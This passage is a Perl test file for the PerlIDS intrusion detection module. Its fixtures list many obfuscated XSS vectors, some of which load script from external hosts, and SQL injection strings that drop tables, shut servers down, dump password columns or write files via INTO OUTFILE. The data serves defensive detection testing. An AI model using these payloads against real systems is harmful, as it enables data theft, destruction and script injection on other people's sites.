#****u* t/01_ids.t
# NAME
#   01_ids.t
# DESCRIPTION
#   Tests for PerlIDS (CGI::IDS)
#   The vector tests are based on PHPIDS https://phpids.org tests/IDS/MonitorTest.php rev. 1409
# AUTHOR
#   Hinnerk Altenburg <hinnerk@cpan.org>
# CREATION DATE
#   2008-07-01
# COPYRIGHT
#   Copyright (C) 2008-2014 Hinnerk Altenburg
#
#   This file is part of PerlIDS.
#
#   PerlIDS is free software: you can redistribute it and/or modify
#   it under the terms of the GNU Lesser General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   PerlIDS is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU Lesser General Public License for more details.
#
#   You should have received a copy of the GNU Lesser General Public License
#   along with PerlIDS.  If not, see <http://www.gnu.org/licenses/>.
#****

#------------------------- Pragmas ---------------------------------------------
use strict;
use warnings;
use utf8;

#------------------------- Libs ------------------------------------------------
use Test::More tests => 79;

# test module loading
BEGIN { use_ok('CGI::IDS') } # diag( "Testing CGI::IDS $CGI::IDS::VERSION, Perl $], $^X" );
BEGIN { use_ok('CGI::IDS::Whitelist') }
BEGIN { use_ok('XML::Simple', qw(:strict)) }
BEGIN { use_ok('HTML::Entities') }
BEGIN { use_ok('MIME::Base64') }
BEGIN { use_ok('Encode', qw(decode)) }
BEGIN { use_ok('Carp') }
BEGIN { use_ok('JSON::XS') }
BEGIN { use_ok('Time::HiRes') }
BEGIN { use_ok('FindBin', qw($Bin)) }

#------------------------- Test Data -------------------------------------------
my %testSimpleScan = (
    'value'     => 'alert(1)',
);

my %testScanKeys = (
    'alert(0)'  => 'hallo',
    'alert(1)'  => 'alert(2)',
    2           => 'alert(#)',
    'alert'     => 'test',
);

my %testWhitelistScan = (
    login_password  =>  'alert(1)',
    name            =>  'hinnerk',
    action          =>  'login',
    scr_rec_id      =>  '876876.987ef987',
    send            =>  '',
);

my %testWhitelistScan2 = (
    login_password  =>  'alert(1)',
    username        =>  'hinnerk attack',
    action          =>  'login',
    scr_rec_id      =>  '876876.9fe87987',
    send            =>  '',
);

my %testWhitelistScan3 = (
    login_password  =>  'alert(1)',
    username        =>  'hinnerk',
    action          =>  'xlogin',
    scr_rec_id      =>  '876876.98ef7987',
    send            =>  '',
);

my %testWhitelistScan4 = (
    login_password  =>  'alert(1)',
    username        =>  'hinnerk',
    action          =>  'login',
    scr_rec_id      =>  '876876.98ef7987alert(1)',
);

my %testWhitelistScan5 = (
    login_password  =>  'alert(1)',
    username        =>  'hinnerk',
    action          =>  'login',
    scr_rec_id      =>  '876876.98ef7987',
);

my %testWhitelistSkip = (
    login_password  =>  'alert(1)',
    username        =>  'hinnerk',
    action          =>  'login',
    scr_rec_id      =>  '876876.9ef87987',
    send            =>  '',
);

my %testWhitelistSkip2 = (
    login_password  =>  'alert(1)',
    username        =>  'hinnerk',
    action          =>  'login',
    scr_rec_id      =>  '876876.9ef87987alert(1)',
    send            =>  'hjjkh98798',
);

my %testWhitelistSkip3 = (
    login_password  =>  'alert(1)',
    username        =>  'hinnerk',
    action          =>  'login',
    scr_rec_id      =>  '876876.9ef87987alert(1)',
    send            =>  'hjjkh98798',
    uid             =>  'alert(2)', # skip uid everytime
);

my %testMalformedUTF8 = ();
{
    my $utf8 = ''; $utf8 .= chr 1<<$_ for 0..63;
    my $malformed_utf8 = '';
    {
        no warnings "utf8";
        $malformed_utf8 = reverse $utf8;
        %testMalformedUTF8 = (
            0 => " DROP TABLE; \x{7FFFFFFF} alert(0); DROP TABLE;",
            1 => "\x{80} alert(1);",
            2 => "\x{bf} alert(2);",
            3 => "\x{ff} alert(3);",
            4 => "\x{002F} alert(4);",
            5 => " DROP TABLE; " . $malformed_utf8 . "alert(5); OR 1=1;",
        );
    }
}

#------------------------- PHPIDS test data ------------------------------------
my %testAttributeBreakerList = (
    0 => '">XXX',
    1 => '" style ="',
    2 => '"src=xxx a="',
    3 => '"\' onerror = alert(1) ',
    4 => '" a "" b="x"',
);

my %testCommentList = (
    0 => 'test/**/blafasel',
    1 => 'OR 1#',
    2 => '<!-- test -->',
);

my %testConcatenatedXSSList = (
        0 => "s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+''; u1=s1+s2+s3;URL=u1",
        1 => "s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;",
        2 => "s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);",
        3 => "s1=['java'+''+''+'scr'+'ipt'+':'+'aler'+'t'+'(1)'];",
        4 => "s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];",
        5 => "s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';",
        6 => "s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;",
        7 => "t0 =1? \"val\":0;t1 =1? \"e\":0;t2 =1? \"nam\":0;t=1? t1+t0:0;t=1?t[1? t:0]:0;t=(1? t:0)(1? (1? t:0)(1? t2+t1:0):0);",
        8 => "a=1!=1?0:'eva';b=1!=1?0:'l';c=a+b;d=1!=1?0:'locatio';e=1!=1?0:'n.has';f=1!=1?0:'h.substrin';g=1!=1?0:'g(1)';h=d+e+f+g;0[''+(c)](0[''+(c)](h));",
        9 => 'b=(navigator);c=(b.userAgent);d=c[61]+c[49]+c[6]+c[4];e=\'\'+/abcdefghijklmnopqrstuvwxyz.(1)/;f=e[12]+e[15]+e[3]+e[1]+e[20]+e[9]+e[15]+e[14]+e[27]+e[8]+e[1]+e[19]+e[8]+e[27]+e[19]+e[21]+e[2]+e[19]+e[20]+e[18]+e[9]+e[14]+e[7]+e[28]+e[29]+e[30];0[\'\'+[d]](0[\'\'+(d)](f));',
        10 => "c4=1==1&&'(1)';c3=1==1&&'aler';c2=1==1&&':';c1=1==1&&'javascript';a=c1+c2+c3+'t'+c4;(URL=a);",
        11 => "x=''+/abcdefghijklmnopqrstuvwxyz.(1)/;e=x[5];v=x[22];a=x[1];l=x[12];o=x[15];c=x[3];t=x[20];i=x[9];n=x[14];h=x[8];s=x[19];u=x[21];b=x[2];r=x[18];g=x[7];dot=x[27];uno=x[29];op=x[28];cp=x[30];z=e+v+a+l;y=l+o+c+a+t+i+o+n+dot+h+a+s+h+dot+s+u+b+s+t+r+i+n+g+op+uno+cp;0[''+[z]](0[''+(z)](y));",
        12 => "d=''+/eval~locat~ion.h~ash.su~bstring(1)/;e=/.(x?.*)~(x?.*)~(x?.*)~(x?.*)~(x?.*)./;f=e.exec(d);g=f[2];h=f[3];i=f[4];j=f[5];k=g+h+i+j;0[''+(f[1])](0[''+(f[1])](k));",
        13 => "a=1!=1?/x/:'eva';b=1!=1?/x/:'l';a=a+b;e=1!=1?/x/:'h';b=1!=1?/x/:'locatio';c=1!=1?/x/:'n';d=1!=1?/x/:'.has';h=1!=1?/x/:'1)';g=1!=1?/x/:'ring(0';f=1!=1?/x/:'.subst';b=b+c+d+e+f+g+h;B=00[''+[a]](b);00[''+[a]](B);",
        14 => "(z=String)&&(z=z() );{a=(1!=1)?a:'eva'+z}{a+=(1!=1)?a:'l'+z}{b=(1!=1)?b:'locatio'+z}{b+=(1!=1)?b:'n.has'+z}{b+=(1!=1)?b:'h.subst'+z}{b+=(1!=1)?b:'r(1)'+z}{c=(1!=1)?c:(0)[a]}{d=c(b)}{c(d)}",
        15 => "{z=(1==4)?here:{z:(1!=5)?'':be}}{y=(9==2)?dragons:{y:'l'+z.z}}{x=(6==5)?3:{x:'a'+y.y}}{w=(5==8)?9:{w:'ev'+x.x}}{v=(7==9)?3:{v:'tr(2)'+z.z}}{u=(3==8)?4:{u:'sh.subs'+v.v}}{t=(6==2)?6:{t:y.y+'ocation.ha'+u.u}}{s=(4==3)?3:{s:(8!=3)?(2)[w.w]:z}}{r=s.s(t.t)}{s.s(r)+z.z}",
        16 => "{z= (1.==4.)?here:{z: (1.!=5.)?'':be}}{y= (9.==2.)?dragons:{y: 'l'+z.z}}{x= (6.==5.)?3:{x: 'a'+y.y}}{w= (5.==8.)?9:{w: 'ev'+x.x}}{v= (7.==9.)?3:{v: 'tr(2.)'+z.z}}{u= (3.==8.)?4:{u: 'sh.subs'+v.v}}{t= (6.==2.)?6:{t: y.y+'ocation.ha'+u.u}}{s= (4.==3.)?3:{s: (8.!=3.)?(2.)[w.w]:z}}{r= s.s(t.t)}{s.s(r)+z.z}",
        17 => "a=1==1?1==1.?'':x:x;b=1==1?'val'+a:x;b=1==1?'e'+b:x;c=1==1?'str(1)'+a:x;c=1==1?'sh.sub'+c:x;c=1==1?'ion.ha'+c:x;c=1==1?'locat'+c:x;d=1==1?1==1.?0.[b]:x:x;d(d(c))",
        18 => "{z =(1)?\"\":a}{y =(1)?{y: 'l'+z}:{y: 'l'+z.z}}x=''+z+'eva'+y.y;n=.1[x];{};;
                            o=''+z+\"aler\"+z+\"t(x)\";
                            n(o);",
        19 => ";{z =(1)?\"\":a}{y =(1)?{y: 'eva'+z}:{y: 'l'+z.z}}x=''+z+{}+{}+{};
                            {};;
                            {v =(0)?z:z}v={_\$:z+'aler'+z};
                            {k =(0)?z:z}k={_\$\$:v._\$+'t(x)'+z};
                            x=''+y.y+'l';{};

                            n=.1[x];
                            n(k._\$\$)",
        20 => "ä=/ä/!=/ä/?'': 0;b=(ä+'eva'+ä);b=(b+'l'+ä);d=(ä+'XSS'+ä);c=(ä+'aler'+ä);c=(c+'t(d)'+ä);\$=.0[b];a=\$;a(c)",
        21 => 'x=/x/
                            \$x=!!1?\'ash\':xx
                            \$x=!!1?\'ation.h\'+\$x:xx
                            \$x=!!1?\'loc\'+\$x:xx
                            x.x=\'\'. eval,
                            x.x(x.x(\$x)
                            )',
        22 => 'a=/x/
                            \$b=!!1e1?\'ash\':a
                            \$b=!!1e1?\'ion.h\'+\$b:a
                            \$b=!!1e1?\'locat\'+\$b:a
                            \$a=!1e1?!1e1:eval
                            a.a=\$a
                            \$b=a.a(\$b)
                            \$b=a.a(\$b)',
        23 => 'y=name,null
                            \$x=eval,null
                            \$x(y)',
        24 => '\$=\'e\'
                        ,x=\$[\$+\'val\']
                        x(x(\'nam\'+\$)+\$)',
        25 => 'typeof~delete~typeof~alert(1)',
        26 => 'ªª=1&& name
                        ª=1&&window.eval,1
                        ª(ªª)',
        27 => "y='nam' x=this.eval x(x(y  ('e') new Array) y)",
);

my %testConcatenatedXSSList2 = (
        0 => "ä=/ä/?'': 0;b=(ä+'eva'+ä);b=(b+'l'+ä);d=(ä+'XSS'+ä);c=(ä+'aler'+ä);c=(c+'t(d)'+ä);ä=.0[b];ä(c)",
        1 => "b = (x());
                        \$ = .0[b];a=\$;
                        a( h() );
                        function x () { return 'eva' + p(); };
                        function p() { return 'l' ; };
                        function h() { return 'aler' + i(); };
                        function i() { return 't (123456)' ; };",
        2 => "s=function test2() {return 'aalert(1)a';1,1}();
                        void(a = {} );
                        a.a1=function xyz() {return s[1] }();
                        a.a2=function xyz() {return s[2] }();
                        a.a3=function xyz() {return s[3] }();
                        a.a4=function xyz() {return s[4] }();
                        a.a5=function xyz() {return s[5] }();
                        a.a6=function xyz() {return s[6] }();
                        a.a7=function xyz() {return s[7] }();
                        a.a8=function xyz() {return s[8] }();
                        \$=function xyz() {return a.a1 + a.a2 + a.a3 +a.a4 +a.a5 + a.a6 + a.a7
                        +a.a8 }();
                        new Function(\$)();",
        3 => "x = localName.toLowerCase() + 'lert(1),' + 0x00;new Function(x)()",
        4 => "txt = java.lang.Character (49) ;rb = java.lang.Character (41) ;lb =
                        java.lang.Character (40) ;a = java./**/lang.Character (97) ;l =
                        java.lang.Character (108) ;e = java.//
                        lang.Character (101) ;r =
                        java.lang.Character (114) ;t = java . lang.Character (116) ; v =
                        java.lang.Character (118) ;f = as( ) ; function msg () { return lb+
                        txt+ rb }; function as () { return a+ l+ e+ r+ t+ msg() }; function
                        ask () { return e+ v+ a+ l };g = ask ( ) ; (0[g])(f) ",
        5 =>  "s=new String;
                            e = /aeavaala/+s;
                            e = new String + e[ 2 ] + e[ 4 ] + e[ 5 ] + e[ 7 ];
                            a = /aablaecrdt(1)a/+s;
                            a = new String + a[ 2]+a[ 4 ] + a[ 6 ] + a[ 8 ] + a[ 10 ] + a[ 11 ]
                            + a[ 12 ] + a[ 13 ],
                            e=new Date() [e];",
        6 => '\$a= !false?"ev":1
                        \$b= !false? "al":1
                        \$a= !false?\$a+\$b:1
                        \$a= !false?0[\$a]:1
                        \$b= !false?"locat":1
                        \$c= !false?"ion.h":1
                        \$d= !false?"ash":1
                        \$b= !false?\$b+\$c+\$d:1
                        \$a setter=\$a,\$a=\$a=\$b',
        7 => "\$1 = /e1v1a1l/+''
                        \$2 = []
                        \$2 += \$1[1]
                        \$2 += \$1[3]
                        \$2 += \$1[5]
                        \$2 += \$1[7]
                        \$2 = \$1[ \$2 ]
                        \$3 = /a1l1e1r1t1(1)1/+''
                        \$4 = []
                        \$4 += \$3[1]
                        \$4 += \$3[3]
                        \$4 += \$3[5]
                        \$4 += \$3[7]
                        \$4 += \$3[9]
                        \$4 += \$3[11]
                        \$4 += \$3[12]
                        \$4 += \$3[13]
                        \$2_ = \$2
                        \$4_ = \$4
                        \$2_ ( \$4_ )",
        8 => 'x=![]?\'42\':0
                        \$a= !x?\'ev\':0
                        \$b= !x?\'al\':0
                        \$a= !x?\$a+\$b:0
                        \$a setter = !x?0[\$a]:0
                        \$b= !x?\'locat\':0
                        \$c= !x?\'ion.h\':0
                        \$d= !x?\'ash\':0
                        \$b= !x?\$b+\$c+\$d:0
                        \$msg= !x?\'i love ternary operators\':0
                        \$a=\$a=\$b',
        9 => "123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);",
        10 => '\$_ = !1-1 ? 0["\ev\al""]("\a\l\ert\(1\)"") : 0',
        11 => "\$\$\$[0] = !1-1 ? 'eva' : 0

                        \$\$\$[1] = !1-1 ? 'l' : 0

                        \$\$\$['".'\j'."o".'\i'."n']([])",
        12 => 'x=/eva/i[-1]
                        \$y=/nam/i[-1]
                        \$x\$_0=(0)[x+\'l\']
                        \$x=\$x\$_0(\$y+\'e\')
                        \$x\$_0(\$x)',
        13 => '\$y=("eva")
                        \$z={}[\$y+"l"]
                        \$y=("aler")
                        \$y+=(/t(1)/)[-1]
                        \$z(\$y)',
        14 => '[\$y=("al")]&&[\$z=\$y]&&[\$z+=("ert")+[]][DocDan=(/ev/)[-1]+\$y](\$z).valueOf()(1)',
        15 => '[\$y=(\'al\')]&[\$z=\$y \'ert\'][a=(1?/ev/:0)[-1] \$y](\$z)(1)',
        16 => "0[('ev')+status+(z=('al'),z)](z+'ert(0),'+/x/)",
        17 => "0[('ev')+(n='')+(z=('al'),z)](z+'ert(0),'+/x/)",
        18 => "\$={}.eval,\$(\$('na'+navigator.vendor+('me,')+/x/))",
        19 => "ale&zwnj;rt(1)",
        20 => "ale&#x200d;rt(1)",
        21 => "ale&#8206;rt(1)",
        22 => 'al&#56325ert(1)',
        23 => 'al&#xdfff;ert(1)',
        25 => '1[<t>__par{new Array}ent__</t>][<t>al{new Array}ert</t>](1) ',
        26 => '(new Option).style.setExpression(1,1&&name)',
        27 => 'default xml namespace=toolbar,b=1&&this.atob
                        default xml namespace=toolbar,e2=b(\'ZXZhbA\')
                        default xml namespace=toolbar,e=this[toolbar,e2]
                        default xml namespace=toolbar,y=1&&name
                        default xml namespace=toolbar
                        default xml namespace=e(y)',
        28 => '-Infinity++in eval(1&&name)',
        29 => 'new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array,
                        x=(\'e\')
                        x=(\'nam\')+(new Array)+x
                        y=(\'val\')
                        y=(\'e\')+(new Array)+y
                        z=this
                        z=z[y]
                        z(z(x)+x)',
        30 => 'undefined,undefined
                        undefined,undefined
                        undefined,undefined
                        undefined,undefined
                        x=(\'aler\
                        t\')
                        undefined,undefined
                        undefined,undefined
                        undefined,undefined
                        undefined,undefined
                        this [x]
                        (1)
                        undefined,undefined
                        undefined,undefined
                        undefined,undefined
                        undefined,undefined',
        31 => 'location.assign(1?name+1:(x))',
        32 => "this[('eva')+new Array + 'l'](/x.x.x/+name+/x.x/)",
        33 => "this[[],('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+name,new Array)",
        34 => 'alal=(/YWxlcnQ/)(/YWxlcnQ/),
                        alal=alal[0],
                        atyujg=(/atob/)(/atob/),
                        con=atyujg.concat,
                        con1=con()[0],
                        con=con1[atyujg],
                        alal=con(alal),
                        alal=con1[alal],
                        alal(1)',
        35 => 'alal=(1,/YWxlcnQ/),
                        alal=alal(alal),
                        alal=alal[0],
                        atyujg=(1,/atob/),
                        atyujg=atyujg(atyujg),
                        atat=atyujg[0],
                        con=atyujg.concat,
                        con1=con(),
                        con1=con1[0],
                        con=con1[atat],
                        alal=con(alal),
                        alal=con1[alal],
                        alal(1)',
);

my %testXMLPredicateXSSList = (
        0 => "a=<r>loca<v>e</v>tion.has<v>va</v>h.subs<v>l</v>tr(1)</r>
                        {b=0e0[a.v.text()
                        ]}http='';b(b(http+a.text()
                        ))
                        ",
        1 => 'y=<a>alert</a>;content[y](123)',
        2 => "s1=<s>evalalerta(1)a</s>; s2=<s></s>+''; s3=s1+s2; e1=/s1/?s3[0]:s1; e2=/s1/?s3[1]:s1; e3=/s1/?s3[2]:s1; e4=/s1/?s3[3]:s1; e=/s1/?.0[e1+e2+e3+e4]:s1; a1=/s1/?s3[4]:s1; a2=/s1/?s3[5]:s1; a3=/s1/?s3[6]:s1; a4=/s1/?s3[7]:s1; a5=/s1/?s3[8]:s1; a6=/s1/?s3[10]:s1; a7=/s1/?s3[11]:s1; a8=/s1/?s3[12]:s1; a=a1+a2+a3+a4+a5+a6+a7+a8;e(a)",
        3 => "location=<text>javascr{new Array}ipt:aler{new Array}t(1)</text>",
        4 => "µ=<µ ł='le' µ='a' ø='rt'></µ>,top[µ.\@µ+µ.\@ł+µ.\@ø](1)",
);

my %testConditionalCompilationXSSList = (
    1 => "/*\@cc_on\@set\@x=88\@set\@ss=83\@set\@s=83\@*/\@cc_on alert(String.fromCharCode(\@x,\@s,\@ss))",
    2 => "\@cc_on eval(\@cc_on name)",
    3 => "\@if(\@_mc680x0)\@else alert(\@_jscript_version)\@end",
    4 => "\"\"\@cc_on,x=\@cc_on'something'\@cc_on",
);

my %testXSSList = (
        0   => '\'\'"--><script>eval(String.fromCharCode(88,83,83)));%00',
        1   => '"></a style="xss:ex/**/pression(alert(1));"',
        2   => 'top.__proto__._= alert
                   _(1)',
        3   => 'document.__parent__._=alert
                  _(1)',
        4   => 'alert(1)',
        5   => "b=/a/,
                    d=alert
                    d(",
        6  => "1
                    alert(1)",
        7  => "crypto [ [ 'aler' , 't' ] [ 'join' ] ( [] ) ] (1) ",
        8  => '<div/style=\-\mo\z\-b\i'."\n".'d\in\g:\url(//business\i'."\n".'fo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>',
        9  => "_content/alert(1)",
        10  => "RegExp(/a/,alert(1))",
        11  => "x=[/&/,alert,/&/][1],x(1)",
        12  => "[1,alert,1][1](1)",
        13  => "throw alert(1)",
        14  => "delete alert(1)",
        15  => "\$=.7.eval,\$(//
                    name
                    ,1)",
        16  => "\$=.7.eval,\$(\$('\rname'),1)",
        17  => "e=1..eval
                            e(e(\"\u200fname\"),e)",
        18  => "<x///style=-moz-\&#x362inding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)>",
        19  => "a//a'\u000aeval(name)",
        20  => "a//a';eval(name)",
        21  => "(x) setter=0?0.:alert,x=0",
        22  => "y=('na') + new Array +'me'
                    y
                    (x)getter=0?0+0:eval,x=y
                    'foo bar foo bar f'",
        23  => "'foo bar foo bar foo bar foo bar foo bar foo bar foo bar foo'
                    y\$=('na') +new Array+'me'
                    x\$=('ev') +new Array+'al'
                    x\$=0[x\$]
                    x\$(x\$(y\$)+y\$)",
        24  => "<applet/src=http://businessinfo.co.uk/labs/xss.html
                    type=text/html>",
        25  => "onabort=onblur=onchange=onclick=ondblclick=onerror=onfocus=onkeydown=onkeypress=onkeyup=onload=onmousedown=onmousemove=onmouseout=onmouseover=onmouseup=onreset=onresize=onselect=onsubmit=onunload=alert",
        26  => 'onload=1&&alert',
        27  => "document.createStyleSheet('http://businessinfo.co.uk/labs/xss/xss.css')",
        28  => 'document.body.style.cssText=name',
        29  => "for(i=0;;)i",
        30  => "stop.sdfgkldfsgsdfgsdfgdsfg in alert(1)",
        31  => "this .fdgsdfgsdfgdsfgdsfg
                        this .fdgsdfgsdfgdsfgdsfg
                        this .fdgsdfgsdfgdsfgdsfg
                        this .fdgsdfgsdfgdsfgdsfg
                        this .fdgsdfgsdfgdsfgdsfg
                        aaaaaaaaaaaaaaaa :-(alert||foo)(1)||foo",
        32  => "(this)[new Array+('eva')+new Array+ 'l'](/foo.bar/+name+/foo.bar/)",
        33  => '<video/title=.10000/aler&#x74;(1) onload=.1/setTimeout(title)>',
        34  => "const urchinTracker = open",
        35  => "-setTimeout(
                        1E1+
                        ',aler\
                        t ( /Mario dont go, its fun phpids rocks/ ) + 1E100000 ' )",
        36 => '<b/alt="1"onmouseover=InputBox+1 language=vbs>test</b>',
        37 => '$$=\'e\'
                        _=$$+\'val\'
                        $=_
                        x=this[$]
                        y=x(\'nam\' + $$)
                        x(y)
                        \'foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar\'',
        38 => '‹img/src=x""onerror=alert(1)///›',
        39 => 'Image() .
                            ownerDocument .x=1',
        40 => CGI::IDS::urldecode('%FF%F0%80%BCimg%20src=x%20onerror=alert(1)//'),
        41 => "',jQuery(\"body\").html(//);\'a'",
        42 => '\',$(fred).set(\'html\',\'magically changes\')
                        \'s',
        43 => "',YAHOO.util.Get.script(\"http://ha.ckers.org/xss.js\")
                        's",
        42 => 'lo=/,Batman/,alert(\'Batman flew here\')',
);

my %testSelfContainedXSSList = (
    0   => 'a=0||\'ev\'+\'al\',b=0||1[a](\'loca\'+\'tion.hash\'),c=0||\'sub\'+\'str\',1[a](b[c](1));',
    1   => 'eval.call(this,unescape.call(this,location))',
    2   => 'd=0||\'une\'+\'scape\'||0;a=0||\'ev\'+\'al\'||0;b=0||\'locatio\';b+=0||\'n\'||0;c=b[a];d=c(d);c(d(c(b)))',
    3   => '_=eval,__=unescape,___=document.URL,_(__(___))',
    4   => '$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))',
    5   => '$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)',
    6   => 'ev\al.call(this,unescape.call(this,location))',
    7   => 'setTimeout//
                        (name//
                        ,0)//',
    8   => 'a=/ev/
                        .source
                        a+=/al/
                        .source,a = a[a]
                        a(name)',
    9   => 'a=eval,b=(name);a(b)',
    10  => 'a=eval,b= [ referrer ] ;a(b)',
    11  => "URL = ! isNaN(1) ? 'javascriptz:zalertz(1)z' [/replace/ [ 'source' ] ]
                        (/z/g, [] ) : 0",
    12  => "if(0){} else eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array)
                        'foo bar foo bar foo'",
    13  => "switch('foo bar foo bar foo bar') {case eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array):}",
    14  => "xxx='javascr',xxx+=('ipt:eva'),xxx+=('l(n'),xxx+=('ame),y')
                            Cen:tri:fug:eBy:pas:sTe:xt:do location=(xxx)
                            while(0)
                            ",
    15 => '-parent(1)',
    16 => "//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf
                        (new Option)['innerHTML']=opener.name",
);

my %testSQLIList = (
    0   => '" OR 1=1#',
    1   => '; DROP table Users --',
    2   => '/**/S/**/E/**/L/**/E/**/C/**/T * FROM users WHERE 1 = 1',
    3   => 'admin\'--',
    4   => 'SELECT /*!32302 1/0, */ 1 FROM tablename',
    5   => '10;DROP members --',
    6   => ' SELECT IF(1=1,\'true\',\'false\')',
    7   => 'SELECT CHAR(0x66)',
    8   => 'SELECT LOAD_FILE(0x633A5C626F6F742E696E69)',
    9   => 'EXEC(@stored_proc @param)',
    10  => 'chr(11)||chr(12)||char(13)',
    11  => 'MERGE INTO bonuses B USING (SELECT',
    12  => '1 or name like \'%\'',
    13  => '1 OR \'1\'!=0',
    14  => '1 OR ASCII(2) = ASCII(2)',
    15  => '1\' OR 1&"1',
    16  => '1\' OR \'1\' XOR \'0',
    17  => '1 OR+1=1',
    18  => '1 OR+(1)=(1)',
    19  => '1 OR \'1',
    20  => 'aaa\' or (1)=(1) #!asd',
    21  => 'aaa\' OR (1) IS NOT NULL #!asd',
    22  => 'a\' or 1=\'1',
    23  => 'asd\' union (select username,password from admins) where id=\'1',
    24  => "1'; WAITFOR TIME '17:48:00 ' shutdown -- -a",
    25  => "1'; anything: goto anything -- -a",
    26  => "' =+ '",
    27  => "asd' =- (-'asd') -- -a",
    28  => 'aa"in+ ("aa") or -1 != "0',
    29  => 'aa" =+ - "0  ',
    30  => "aa' LIKE 0 -- -a",
    31  => "aa' LIKE md5(1) or '1",
    32  => "aa' REGEXP- md5(1) or '1",
    33  => "aa' DIV\@1 = 0 or '1",
    34  => "aa' XOR- column != -'0",
    35  => '============================="',
);

my %testSQLIList2 = (
    0   => 'asd"or-1="-1',
    1   => 'asd"or!1="!1',
    2   => 'asd"or!(1)="1',
    3   => 'asd"or@1="@1',
    4   => 'asd"or-1 XOR"0',
    5   => 'asd" or ascii(1)="49',
    6   => 'asd" or md5(1)^"1',
    7   => 'asd" or table.column^"1',
    8   => 'asd" or @@version^"0',
    9   => 'asd" or @@global.hot_cache.key_buffer_size^"1',
    10  => 'asd" or!(selec79t name from users limit 1)="1',
    11  => '1"OR!"a',
    12  => '1"OR!"0',
    13  => '1"OR-"1',
    14  => '1"OR@"1" IS NULL #1 ! (with unfiltered comment by tx ;)',
    15  => '1"OR!(false) #1 !',
    16  => '1"OR-(true) #a !',
    17  => '1" INTO OUTFILE "C:/webserver/www/readme.php',
    18  => "asd' or md5(5)^'1 ",
    19  => "asd' or column^'-1 ",
    20  => "asd' or true -- a",
    21  => '\"asd" or 1="1',
    22  => "a 1' or if(-1=-1,true,false)#!",
    23  => 'aa\\\\"aaa'."' or '1",
    24  => "' or id= 1 having 1 #1 !",
    25  => "' or id= 2-1 having 1 #1 !",
    26  => "aa'or null is null #(",
    27  => "aa'or current_user!=' 1",
    28  => "aa'or BINARY 1= '1",
    29  => "aa'or LOCALTIME!='0",
    30  => "aa'like-'aa",
    31  => "aa'is".'\N'."|!'",
    32  => "'is".'\N'."-!'",
    33  => "asd'|column&&'1",
    34  => "asd'|column!='",
    35  => "aa'or column=column -- #aa",
    36  => "aa'or column*column!='0",
    37  => "aa'or column like column -- #a",
    38  => "0'*column is ".'\N'." - '1",
    39  => "1'*column is ".'\N'." or '1",
    40  => "1'*\@a is ".'\N'." - '",
    41  => "1'*\@a is ".'\N'." or '1",
    42  => "1' -1 or+1= '+1 ",
    43  => "1' -1 - column or '1 ",
    44  => "1' -1 or '1",
    45  => " (1)or(1)=(1) ",
);

my %testSQLIList3 = (
    0   => "' OR UserID IS NOT 2",
    1   => "' OR UserID IS NOT NULL",
    2   => "' OR UserID > 1",
    3   => "'  OR UserID RLIKE  '.+' ",
    4   => "'OR UserID <> 2",
    5   => "1' union (select password from users) -- -a",
    6   => "1' union (select'1','2',password from users) -- -a",
    7   => "1' union all (select'1',password from users) -- -a",
    8   => "aa'!='1",
    9   => "aa'!=~'1",
    10  => "aa'=('aa')#(",
    11  => "aa'|+'1",
    12  => "aa'|!'aa",
    13  => "aa'^!'aa ",
    14  => "abc' = !!'0",
    15  => "abc' = !!!!'0",
    16  => "abc' = !!!!!!!!!!!!!!'0",
    17  => "abc' = !0 = !!'0",
    18  => "abc' = !0 != !!!'0",
    19  => "abc' = !+0 != !'0 ",
    20  => "aa'=+'1",
    21  => "';if 1=1 drop database test-- -a",
    22  => "';if 1=1 drop table users-- -a",
    23  => "';if 1=1 shutdown-- -a",
    24  => "'; while 1=1 shutdown-- -a",
    25  => "'; begin shutdown end-- -a ",
    26  => "'+COALESCE('admin') and 1 = !1 div 1+'",
    27  => "'+COALESCE('admin') and @\@version = !1 div 1+'",
    28  => "'+COALESCE('admin') and @\@version = !@\@version div @\@version+'",
    29  => "'+COALESCE('admin') and 1 =+1 = !true div @\@version+'",
);

my %testSQLIList4 = (
    0   => "aa'in (0)#(",
    1   => "aa'!=ascii(1)#(",
    2   => "' or SOUNDEX (1) != '0",
    3   => "aa'RLIKE BINARY 0#(",
    4   => "aa'or column!='1",
